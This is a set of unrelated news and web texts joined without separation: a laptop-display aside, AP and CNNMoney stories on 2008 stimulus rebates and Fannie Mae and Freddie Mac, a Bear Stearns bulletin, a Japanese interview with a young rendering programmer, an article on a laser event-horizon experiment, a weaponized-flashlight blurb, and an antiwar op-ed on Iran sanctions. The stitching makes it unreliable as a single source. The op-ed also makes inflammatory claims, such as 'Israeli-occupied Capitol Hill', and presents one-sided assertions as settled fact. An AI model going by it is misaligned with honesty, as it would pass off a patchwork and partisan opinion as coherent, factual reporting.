The Infinite Loop writers appear to occupy the other end of the spectrum ; editor Jacqui Cheng prefers to work on a single display , while David Chartier uses the fullscreen mode of MacJournal to filter out distractions when writing .
As a dedicated laptop user , I find myself somewhere in between .
I buy the largest laptop available at the time ( I 'm currently using a 17 " model ) , and use virtual desktop software ( now part of Mac OS X 10.5 ) to provide task - focused workspaces .
In the end , however , we 'd all likely fall into the " experienced user " category that could get basic tasks done quickly with however many pixels were currently available .

WASHINGTON ( AP ) 
At a cost of nearly $ 42 million , the IRS wants you to know :
Your check is almost in the mail .
The Internal Revenue Service is spending the money on letters to alert taxpayers to expect rebate checks as part of the economic stimulus plan .
The notices are going out this month to an estimated 130 million households who filed returns for the 2006 tax year , at a cost $ 41.8 million , IRS spokesman John Lipold confirmed .
That works out to about 32 cents to print , process and mail each letter .
It does n't include the tab for another round of mailings planned for those who did n't file tax returns last year but may still qualify for a rebate .
Democrats accused the Bush administration of wasting time and postage .
" There are countless better uses for $ 42 million than a self - congratulatory mailer that gives the president a pat on the back for an idea that was n't even his , " Sen .
Charles Schumer said Friday , arguing the IRS could more effectively spend the money to catch tax cheats .
The IRS spokesman declined to comment on Schumer 's criticism .
" Dear Taxpayer , " the letters will begin , going on to say the IRS is pleased to inform the recipient that Congress passed and President Bush signed into law a plan that will provide payments of up to $ 600 for individuals who qualify or $ 1,200 for married couples filing jointly .
The rebates are the centerpiece of a $ 168 billion economic stimulus package .
The actual rebate checks are scheduled to go out starting in May , after the IRS has finished separately mailing out routine refunds for the 2007 tax year .
The letters will be a reminder that people need to file a 2007 tax return so they will receive the rebate if they are eligible for it .
Similar notices will go out later to some Social Security recipients and those who receive veterans benefits — groups that often do not file tax returns .
For those people to get a rebate check , they will need to file a tax return if they received at least $ 3,000 from a combination of certain Social Security benefits , veterans benefits and earned income .
The minimum payment for this group will be $ 300 for an individual and $ 600 for a couple filing jointly .
Not everyone will be eligible .
Singles with income of more than $ 75,000 and couples with more than $ 150,000 get only partial rebates , if any .
People who earn less than $ 3,000 , illegal immigrants and anyone who does not file a tax return will miss out .
Singles with incomes exceeding $ 87,000 and couples with incomes exceeding $ 174,000 also wo n't qualify , although those caps rise by $ 6,000 per child .

NEW YORK ( CNNMoney.com ) --
An additional $ 200 billion in financing is headed to the battered mortgage markets after federal regulators Wednesday said they would allow finance giants Fannie Mae and Freddie Mac to reduce the capital they keep on hand .
The move is the latest attempt by policymakers to ease the housing crisis , although it raises risks faced by two government - sponsored firms that are crucial to the functioning of global financial markets .
The rule change was announced by the Office of Federal Housing Enterprise Oversight , ( OFHEO ) , a normally low - profile agency that sets rules for the two government sponsored companies that between them hold or guarantee nearly $ 5 trillion in mortgages .
Fannie ( FNM ) and Freddie ( FRE , Fortune 500 ) are two publicly - traded companies set up by the federal government nearly 40 years ago to help provide financing needed by lenders looking to make home loans .
With the change , they are expected to buy or guarantee $ 2 trillion in mortgages .
That is about $ 200 billion more than they would have without the rule changes announced Wednesday .
Kieran Quinn , the chairman of the Mortgage Bankers Association , said the new rules are a crucial step in reestablishing the pipeline of funds that flow from investors through lenders to those buying a home or refinancing a mortgage .
" This will enhance lenders ' ability to offer financing to a wide variety of borrowers , " said Quinn .
" This should help keep some at - risk borrowers in their homes which will help stabilize the real estate market . "
Relief for troubled markets
Both firms have been working in recent years to clean up accounting problems .
During that process , OFHEO has been requiring them to keep 30 % extra capital in reserve .
The rule change allows them to reduce that excess capital to only 20 % .
Even as the market for mortgage - backed securities has melted down over the past year , the securities backed by the so - called conforming loans that met Freddie and Fannie criteria were considered the gold standard .
By the fourth quarter of 2007 , the two firms between them were responsible for nearly three - quarters of mortgage backed securities on the market .
But the loans that backed those securities could not be made to borrowers who had less than top credit scores , did not have significant equity in their home or needed loans for more than $ 417,000 .
Congress recently raised the limits for the loans that Fannie and Freddie can buy or insure up to $ 729,750 , increasing the risks for the firm and the demands on their capital .
The new loan rules were seen as a necessary step to end the credit squeeze that has hammered home values across the nation and caused billions in losses and writedowns on Wall Street , raising the risk of a recession .
Change in thinking
The lower capital limits are important , not just for the additional $ 200 billion they make available , but for the change of thinking it signals in the Bush administration , said Jaret Seiberg , financial services analyst for policy research firm Stanford Group .
" The psychology is quite critical here , " said Seiberg .
" There is now an increasing view in the market that the administration understands the seriousness of the crisis and is willing to take steps it previously dismissed . "
In recent weeks , Wall Street 's appetite for mortgage - backed securities insured by Fannie and Freddie started to wane .
That weakening demand helped force mortgage rates higher than they would have been .
" That showed that investors were starting to get nervous , " said Seiberg .
" That could have had a devastating impact on not just the mortgage market but the economy .
Any step to make sure that market remains liquid is an important one . "
But there are risks involved in Fannie and Freddie lowering their capital reserves and in buying larger loans .
If problems in the housing and mortgage markets continue to deepen , it could in the worst case scenario lead to a federal government bailout of Fannie and Freddie .
Seiberg believes that 's a risk worth taking given the need to inject more cash into the market .
" There 's a trade off when you lower capital levels , you take on more risk , " said Seiberg .
" That 's unavoidable .
The question going forward is whether Freddie and Fannie can manage that risk . "
But some argued the risks are not worth it and this was the wrong move .
" In truth , both Fannie and Freddie are already in a more precarious position than politicians or investors would like to admit , " said Peter Schiff , president of Euro Pacific Capital , a brokerage firm focusing on overseas investments .
" Lowering reserve requirements is simply an irresponsible attempt to postpone the pain of falling home prices , but it will simply result in greater indebtedness and a deeper recession . "
OFHEO Director James Lockhart said in a statement he was confident that both firms have resolved their accounting issues enough to allow the agency to lower its previous capital requirements .
He pointed out that as part of this initiative , both companies announced that they will begin the process to raise significant additional capital .
" Let me be clear - both companies have prudent cushions above the OFHEO - directed capital requirements and have increased their reserves , " he said .
" We believe they can play an even more positive role in providing the stability and liquidity the markets need right now . "
Fannie Mae CEO
Daniel Mudd said while the rules changes are not a complete solution for the embattled housing and home loan markets , he believes it will help , even though the two firms will continue to focus on prime loans to borrowers with good credit and a large amount of equity in their homes .
" We hope it will help restart the housing engine that powers our economy , " he said .
NEW YORK ( Reuters ) - Bear Stearns Inc BSC.N shares fell 50 percent on Friday , on news the bank 's liquidity position had deteriorated significantly in the last 24 hours , prompting it to secure financing from JPMorgan Chase JPM.N and the Federal Reserve Bank of New York .
Shares fell to $ 28.59 on the New York Stock Exchange .
「天才」――こう呼ばれる人物は各分野に存在する。上野康平さんもそんな1人だ。「バイナリアンスレッド」の第1回に登場いただいた井上恭輔さん同様、IPAの未踏ソフトウェア創造事業から天才プログラマー／スーパークリエータの称号を贈られた上野さん。彼が注目を集めたのは、彼が18歳であったことが大きい。
未踏ユースをのぞいてみれば、18歳という年齢は特別若いわけでもない。上野さん自身、未踏ユースの採択時には17歳だった。上野さんの場合、飛び級を重ね、18歳にして千葉大学理学部先進科学プログラム2年生であるという点が、ニュースを見た人を2度驚かせたのだろう。未踏の先輩、井上恭輔さんにはじまった「
New Generation Chronicle：バイナリアンスレッド」。第2回は上野康平さんにご回答いただいた。
こちらでは、プロローグとして厳選した10個の質問をお届けする。天才の知られざる側面がつまびらかに語られた完全版はこちらで公開している。
「 不気味の谷」を超えた、感覚的に正しいレンダリングに向けて
―― 今の自分が形成される上で最も影響があったと思う出来事は？
中学2年のときに参加し たScience Fair（自由研究大会）ですかね。そこで簡単なレンダラを発表して、今に至るという感じですので。小学校3年生のとき、父の仕事の関係で米国に引っ越したのですが、そこでのIQテストの結果、数学と科学で1学年ずつ飛び級をすることになりました。飛び級のクラスでは自由に学べる時間が多く取られているので、そうしたことが後に大きく影響したのだと思います。
ただ、飛び級というのが何だか一人歩きしているような気もしますが、実際のところ、日本の教育を普通にやっていれば、飛び級は別に珍しいことではありません。あまり知られていないようで、日本人は申請する人が少ないようですが、実は強気に出ればみんな飛び級になったりすると思いますよ。
高校のときに日本に戻ったのですが、いつかまた米国に戻りたいと考えていたので、日本でも飛び級を受けてみました。6時間ほど物理と数学の試験を受けたのですが、決まった答えがない、いわゆる思考問題だと感じました。前提知識の量だけではなく、その場で自分で勉強するバイタリティであったり（参考書籍は用意されている）、既出パターンではない問題への応用力、6時間ギブアップしない忍耐力などが問われる試験でしたね。
ちなみに、わたしと同じ期ではわたしを含め4人が飛び級制度で物理学コースに入学していますが、わたしと同じ学校（東京学芸大学付属高校）で同じ部活（数理科学研究部）の方も入学されるというレアな年だったようです。
―― 開発環境はどんなものを使っていますか ？
長ら くWindows XP上でVisualStudioを使っていましたが、最近はMac OS X／Linuxに開発環境を移行しました。Vimエディタとgcc／autotoolsでちまちまと作っています。gdbで追うことが難しいバグが発生した場合、VisualStudioのビジュアルなデバッガ環境を用いることもあります。
現在レンダラを書くのにメインで使っているのはC++です。やはり実行速度はレンダラにとって最優先課題なので、できるだけ低レベルな言語で書くことが求められます。その点、オブジェクト指向の再利用性、可読性、DRY（Dont Repeat Yourself）性を確保しつつ、ネイティブコードにコンパイルできるC++はレンダラなど実行速度が重要なアプリケーションの開発には最も向いていると思われます。
ただ、最近はC++で書いてしまって少し後悔しているところもあります。あまりにもC++の言語仕様が複雑すぎるからです。5年間ほどこの言語を使ってプログラミングをしていますが、いまだにマスターできる気がしません。
歴史が長いことからC言語との互換性／親和性などから過去の遺産を多く引きずっているところも多く、とても合理的とは思えない仕様にもしばしば出くわします。自由度が「高すぎる」テンプレートメタプログラミングは書いていて非常に楽しいのですが、バッドノウハウの固まりでもあり、気をつけないとすぐに暗号めいた記述になってしまいます。
―― 既存のレンダラの問題点はどこで、自身が今研究しているものはそれをどう解決しようとしているのか、分かりやすく説明してみてください。
わたしが作ったレンダラは、土台がボロボロな既存のレンダラを一度作り直す必要があると感じて開発しました。
既存のレンダラの問題点は、材質の物理的性質としての効果なのか、演出手法としての効果なのかを区別せずにレンダリングを行っていることにあります。きちんと両者を分離して計算することで、写実的CGに特化した手法を一般的なCG制作に幅広く使用することができます。
物理ベースレンダリングは研究としては既に1つの限界点に達していると思います。次に来るのは、「不気味の谷」を超えた、感覚的に正しいレンダリングではないでしょうか。
―― Windowsしか知らないプログラマーはどうですか？
一般的にプログラミングの中 でOS 依存の知識が占める割合はそんなに大きいものではないと思うので、別に構わないのではないでしょうか。LinuxやMac OSXなど、UNIXベースのプログラミングはWindowsより素直なので、学ぼうと思ったらすぐに学べるものだと思います。
わたし自身は、中学、高校のころからGentoo Linuxを使っていました。あのカリカリ感というか、メンテナンスすらも楽しんでやっていましたが、もう少し開発に力入れたいなと思ったときに、そのメンテナンスが少し手間に感じられるようになり、Debian GNU/Linuxに移行しました。持ち歩いているノートPCはWindowsとDebianのデュアルブートにしています。ちなみにウィンドウマネージャはratpoison。GNU
Screenに似たキーボードドリブンインタフェースを持つウィンドウマネージャで、プログラミング中の思考に割り込みが入ることを極限まで下げるようにデザインされているだけあり、その威力は素晴らしいです。本当に作業に集中したいときにはお勧めです。
Gentooを使っていたという点でお分かりかと思いますが、基本的に全部自分で管理したいので、ミニマムでインストールして、後は必要なものだけを自分でインストールしていくスタイルの方が好きです。「え？ ミニマムだ とbzipすら入らないの？」みたいな（笑）。そういう意味で、Ubuntuとかダメなんですよ。いろいろ要らないものがインストールされてしまい、まず「apt-get remove」からはじめないといけないので……。でも、UbuntuはPS3にインストールしていたりします。

Researchers at St. Andrews University , Scotland , claim to have found a way to simulate an event horizon of a black hole – not through a new cosmic observation technique , and not by a high powered supercomputer … but in the laboratory .
Using lasers , a length of optical fiber and depending on some bizarre quantum mechanics , a “ singularity ” may be created to alter a laser ’s wavelength , synthesizing the effects of an event horizon .
If this experiment can produce an event horizon , the theoretical phenomenon of Hawking Radiation may be tested , perhaps giving Stephen Hawking the best chance yet of winning the Nobel Prize .
So how do you create a black hole ?
In the cosmos , black holes are created by the collapse of massive stars .
The mass of the star collapses down to a single point ( after running out of fuel and undergoing a supernova ) due to the massive gravitational forces acting on the body .
Should the star exceed a certain mass “ limit ” ( i.e. the Chandrasekhar limit – a maximum at which the mass of a star cannot support its structure against gravity ) , it will collapse into a discrete point ( a singularity ) .
Space - time will be so warped that all local energy ( matter and radiation ) will fall into the singularity .
The distance from the singularity at which even light cannot escape the gravitational pull is known as the event horizon .
High energy particle collisions by cosmic rays impacting the upper atmosphere might produce micro- black holes ( MBHs ) .
The Large Hadron Collider ( at CERN , near Geneva , Switzerland ) may also be capable of producing collisions energetic enough to create MBHs .
Interestingly , if the LHC can produce MBHs , Stephen Hawking ’s theory of “ Hawking Radiation ” may be proven should the MBHs created evaporate almost instantly .
Hawking predicts that black holes emit radiation .
This theory is paradoxical , as no radiation can escape the event horizon of a black hole .
However , Hawking theorizes that due to a quirk in quantum dynamics , black holes can produce radiation .
Put very simply , the Universe allows particles to be created within a vacuum , “ borrowing ” energy from their surroundings .
To conserve the energy balance , the particle and its anti-particle can only live for a short time , returning the borrowed energy very quickly by annihilating with each other .
So long as they pop in and out of existence within a quantum time limit , they are considered to be “ virtual particles ” .
Creation to annihilation has net zero energy .
However , the situation changes if this particle pair is generated at or near an event horizon of a black hole .
If one of the virtual pair falls into the black hole , and its partner is ejected away from the event horizon , they cannot annihilate .
Both virtual particles will become “ real ” , allowing the escaping particle to carry energy and mass away from the black hole ( the trapped particle can be considered to have negative mass , thus reducing the mass of the black hole ) .
This is how Hawking radiation predicts “ evaporating ” black holes , as mass is lost to this quantum quirk at the event horizon .
Hawking predicts that black holes will gradually evaporate and disappear , plus this effect will be most prominent for small black holes and MBHs .
So … back to our St. Andrews laboratory …
Prof Ulf Leonhardt is hoping to create the conditions of a black hole event horizon by using laser pulses , possibly creating the first direct experiment to test Hawking radiation .
Leonhardt is an expert in “ quantum catastrophes ” , the point at which wave physics breaks down , creating a singularity .
In the recent “ Cosmology Meets Condensed Matter ” meeting in London , Leonhardt ’s team announced their method to simulate one of the key components of the event horizon environment .
Light travels through materials at different velocities , depending on their wave properties .
The St. Andrews group use two laser beams , one slow , one fast .
First , a slow propagating pulse is fired down the optical fiber , followed by a faster pulse .
The faster pulse should “ catch up ” with the slower pulse .
However , as the slow pulse passes through the medium , it alters the optical properties of the fiber , causing the fast pulse to slow in its wake .
This is what happens to light as it tries to escape from the event horizon – it is slowed down so much that it becomes “ trapped ” .
“ We show by theoretical calculations that such a system is capable of probing the quantum effects of horizons , in particular Hawking radiation . ” – From a forthcoming paper by the St. Andrews group .
The effects that two laser pulses have on eachother to mimic the physics within an event horizon sounds strange , but this new study may help us understand if MBHs are being generated in the LHCs and may push Stephen Hawking a little closer toward a deserved Nobel Prize .

Okay , the flashlight machine gun was alarming enough , but now there 's also the Pentagon Porcupine weaponized flashlight .
A kind of all - in - one gadget for the frightened , it can help you find your car keys if you drop them in the dark , and / or blind and wound an attacker .
Or victim , for that matter .

The eye - dazzling power comes from a 70 lumen xenon bulb , which is powerful even while it's no maxablaster , while the spiky bezel is sharpened " more than ordinary crenellated bezels " for slashing and stabbing action .
The spikes are retractable , so you can safely slip this into a pocket , we guess .
In olive drab , for that extra " military " chic , the 4.8 oz 5 - inch flashlight will give 60 minutes of continuous light from its batteries .

It is “ a steppingstone to war , ” said Rep. Dennis Kucinich , during the debate over the so - called Iran Freedom Support Act , and if this vote is any measure of the degree of congressional opposition to the looming prospect of war with Tehran , then we have a lot to worry about .
Only 21 members of the House stood up against the overwhelming bipartisan wave of support for the bill , which would impose economic sanctions on the Iranians  and openly proclaims the goal of effecting “ regime change . ”
Rep. Ron Paul , a Texas Republican , said the bill reminds him of a 1998 congressional resolution  the Iraq Liberation Act  that paved the way for the Iraqi debacle .
Yet most of the “ antiwar ” contingent in the House of Representatives caved and voted in favor , including Democrats John Conyers , Maxine Waters , Jack Murtha , Bernie Sanders , Barbara Lee , and Lynn Woolsey .
The bill was opposed by the Bush administration , which officially holds that diplomacy is the way to go on the Iranian nukes issue .
Thus it was supported by many Democrats , including the voluble Tom Lantos ( D - Calif. ) , a co-author of the bill along with Florida Republican Ileana Ros-Lehtinen .
Passage is a major goal of AIPAC , Israel ’s premier lobbying organization in the U.S. , which for the past two years has featured the alleged Iranian threat to America as its convention theme : this year ’s conclave featured a multimedia exhibit supposedly dramatizing how Iran is “ pursuing nuclear weapons and how it can be stopped . ”
As Middle East expert Trita Parsi , of the Johns Hopkins School for Advanced International Studies , put it : “ I do n’t see any other major groups behind this legislation that have had any impact on it . ”
The Israelis have made no secret of their efforts to get Uncle Sam to launch an attack .
If you guys do n’t , a number of Israeli officials have implied , then we will .
This last , however , is an empty threat , as the Israelis do n’t have the military capacity to wipe out Iran ’s widely dispersed nuclear research facilities in a single blow , and , in any case , are more than likely to wait until the last possible moment before they take the unusual step of fighting their own war .
After all , why should they , when the U.S. is perfectly willing to sacrifice American troops and treasure on the altar of Israel ’s alleged national security interests ?
Iran represents a threat to nothing and no one but Israel , and everybody knows it .
It is likewise universally acknowledged that the one Middle Eastern power we definitely know to be in possession of a substantial nuclear stockpile is Israel .
The Iranians , then , could be seen as engaging in a defensive policy of deterrence : after all , Israel has never even acknowledged its nukes , let alone declared a policy of “ no first strike . ”
Unlike the Israelis , the Iranians are signatories of the Nuclear Nonproliferation Treaty .
But of course we are n’t allowed to mention that , because depicting the government of Israel as a gang of duplicitous scheming aggressors intent on holding a nuclear sword of Damocles over the entire Middle East would be “ anti-Semitic , ” according to the latest definition of anti-Semitism , albeit all too true .
The timing on this vote is significant on two counts .
Coming as it did at a time when the debate about Israel ’s inordinate influence over U.S. foreign policy is getting heated , this vote demonstrates that , as John J. Mearsheimer and Stephen Walt point out in “ The Israel Lobby “ :
“ AIPAC , which is a de facto agent for a foreign government , has a stranglehold on the U.S. Congress .
Open debate about U.S. policy towards Israel does not occur there , even though that policy has important consequences for the entire world . ”
The sheer power of what Mearsheimer and Walt call “ the Lobby ” is further demonstrated by the general public revulsion against the consequences of our very similar policy in Iraq .
The unpopularity of our military presence in the Middle East has not deterred politicians from jumping on the war - with - Tehran bandwagon .
Even as ( some ) Democratic lawmakers decry the occupation of Iraq and call for a timetable for U.S. troop withdrawal , they join in the war whoops of the neoconservatives who are pushing to ignite a new war with Tehran .
So much for the Democratic Party as a vehicle for antiwar sentiment .
While the Iran Freedom Support Act contains language explicitly disavowing the charge that it represents a blank check for war with Iran , that is precisely what it does .
It sets the stage for isolating Iran economically and paves the way for the creation of an Iranian version of Ahmed Chalabi and his “ heroes in error . ”
We will , once again , pay for the privilege of being lied to .
As that old Peter , Paul , and Mary song goes : “ When will they ever learn ?
When will they ever learn ? ”
In the Senate , the primary proponents of this bill are likely to be Hillary Clinton and the rabidly neocon wing of the Republican Party .
Hillary came out for sanctions long ago , and , in a fiery speech to AIPAC , stopped just short of calling for war with Iran if the mullahs did not cease and desist .
Go here for an entirely plausible “ future history ” account of “ the tragedy that followed Hillary Clinton ’s bombing of Iran in 2009 . ”
The matter - of - fact opening of Timothy Garton Ash ’s near - future scenario is frighteningly plausible :
“ May 7 , 2009 , will surely go down in history alongside September 11 , 2001 .
‘ 5/7 , ’ as it inevitably became known , saw massive suicide bombings in Tel Aviv , London , and New York , as well as simultaneous attacks on the remaining Western troops in Iraq and Afghanistan .
Total casualties were estimated at around 10,000 dead and many more wounded .
The attacks , which included the explosion of a so - called dirty bomb in London , were orchestrated by a Tehran - based organization for ‘ martyrdom - seeking operations ’ established in 2004 .
‘ 5/7 ’ was the Islamic Republic of Iran ’s response to the bombing of its nuclear facilities , which President Hillary Clinton had ordered in March 2009 . ”
Seymour Hersh and others seem to think the Bush administration will beat President Hillary to it , and that military operations involving both the Americans and the Israelis have already commenced .
The Iran Freedom Support
Act would merely drag these covert activities up into the sunlight , although their roots would stay submerged in the murky underworld of shadowy exile groups and Pentagon subcontractors .
Passage of the Act would give rise to a whole new sector of the democracy - export business .
Iranian exile groups  including monarchists , Marxists , and a motley collection of alleged “ democrats ”  would vie for funds and the American imprimatur .
A new gold rush for the democracy exporters would commence , shifting the scene of the action from Iraq to Iran , even as the War Party sets its sights on the latter .
Let no one say they were against this war with Iran , when it comes , if they did n’t vote with the heroic 21 naysayers .
These sanctions against Iran are but a prelude to war , just as sanctions were the first step in the long run-up to the invasion of Iraq .
However , we may not enjoy such a lengthy interval between cause and effect this time around .
Events are proceeding at an ever accelerating pace , with Secretary of State Condoleezza Rice now saying the time for talking is over and the time for action has begun  not military action ( at least not yet ) , but action by the Security Council of the United Nations , whose “ credibility is at stake . ”
I wonder if that same standard applies to the many UN resolutions that Israel continues to defy .
Has n’t the UN already lost all credibility when such brazen defiance has gone unnoticed by the Security Council ?
Let no one say they were n’t warned .
Using Iraq as a “ model ” for the methodology of the War Party , we can see , when it comes to Iran , that all the elements are falling neatly into place .
Once again , we have the specter of WMD and their possible existence or nonexistence : a mirage projected by the credulous Western “ mainstream ” media , one that is sure to dissipate only after we ’re waist - deep in an Iranian quagmire .
Another familiar phenomenon : dubious exile groups , along the lines of the infamous Iraqi National Congress , only this time even wackier , wilder , and woolier .
The Bush administration is going too slow for the Lobby ’s taste , and the House vote is a good indication of their displeasure .
In spite of widespread antiwar sentiment and a general disgust with the notion of meddling in the affairs of other nations , the War Party has effectively seized control not only of major policymaking bodies of the U.S. government , but also both major political parties .
Mearsheimer and Walt describe the campaign by Israel ’s amen corner to rush us into another war :
“ The Bush administration has responded to the Lobby ’s pressure by working overtime to shut down Iran ’s nuclear program .
But Washington has had little success , and Iran seems determined to get a nuclear arsenal .
As a result , the Lobby has intensified its pressure on the U.S. government , using all of the strategies in its playbook . ”
One new strategy is to be prepared to abandon the Republicans if a sufficiently warlike Democrat  such as Hillary Clinton  wins the nod for a White House run .
As for this White House , while it may have developed plans for an attack on Iran , the current administration seems eager to draw out the diplomatic dance as long as possible , even in the face of what Mearsheimer and Walt depict as a Katrina - like storm of propaganda and political pressure :
“ Op-eds and articles now warn of imminent dangers from a nuclear Iran , caution against any appeasement of a ‘ terrorist ’ regime , and hint darkly of preventive action should diplomacy fail .
The Lobby is also pushing Congress to approve the Iran Freedom Support Act , which would expand existing sanctions on Iran .
Israeli officials also warn they may take preemptive action should Iran continue down the nuclear road , hints partly intended to keep Washington focused on this issue . ”
The Lobby is on the march , and war is in the wind .
The cries of the banshee pundits and the sonorous resolutions coming out of Israeli - occupied Capitol Hill , are portents of the coming storm .
Mearsheimer and Walt , two distinguished professors from two of our nation ’s most prestigious universities , have been vilified by the Amen Corner and have had their thesis twisted and willfully misunderstood by ultra-Zionists and anti-Semites alike .
They have admirably refused to get down in the gutter with such dishonest , agenda - driven scribblers , and instead have let their work speak for itself as a predictor and critic of U.S. policy in the Middle East :
“ One might argue that Israel and the Lobby have not had much influence on U.S. policy toward Iran , because the United States has its own reasons to keep Iran from going nuclear .
This is partly true , but Iran ’s nuclear ambitions do not pose an existential threat to the United States .
If Washington could live with a nuclear Soviet Union , a nuclear China , or even a nuclear North Korea , then it can live with a nuclear Iran .
And that is why the Lobby must keep constant pressure on U.S. politicians to confront Tehran .
Iran and the United States would hardly be allies if the Lobby did not exist , but U.S. policy would be more temperate and preventive war would not be a serious option . ”
As for this essay ’s predictive value : in light of the knowledge that it was commissioned by The Atlantic magazine and written sometime last year , the section on the Iran nuke issue seems prescient , an ample demonstration of the paper ’s thesis  that the Israel lobby has hijacked American foreign policy , especially when it comes to the Middle East .
Mearsheimer and Walt ’s critique of U.S. policy , as distorted by neoconservative fealty to Israel , is more than borne out by the Iran nuke brouhaha .
Iranian missiles trained on Tel Aviv , or even London , do not a threat to the U.S. make .
It is doubtful they represent a plausible threat even to the targeted cities , as the threat of massive retaliation in kind would successfully deter such a heinous act , just as it deterred Stalin and his successors for half a century .
It is both alarming and baffling that we have any number of lobbies operating out of Washington on behalf of dozens of foreign countries : not only Israel , but all sorts of overseas potentates and unsavory dictators of one sort or another have their bought - and - paid - for Amen Corners in the form of at least one pricey public relations firm .
But I have yet to hear of a foreign policy lobby that operates on behalf of Americans  that looks out for exclusively American interests .
Why is n’t there a countering force arrayed against all these foreign agents and their domestic allies who push for the narrow interests of the “ homeland ”  usually at Uncle Sam ’s expense ?
Who will lobby Congress to start putting America first ?
